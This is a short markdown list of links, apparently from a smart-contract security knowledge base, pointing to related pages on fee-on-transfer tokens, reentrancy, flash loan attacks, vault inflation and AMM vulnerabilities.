- [Fee-on-Transfer Tokens](../fee-on-transfer-tokens/fee-on-transfer-tokens.md) - Basic FoT handling
- [Reentrancy Patterns](../reentrancy/) - General reentrancy vulnerabilities
- [Flash Loan Attacks](../flash-loan-attacks/) - Flash loan amplification
- [Vault Inflation Attack](../vault-inflation-attack/) - Related accounting issues
- [AMM Vulnerabilities](../../amm/) - DEX-specific attack patterns
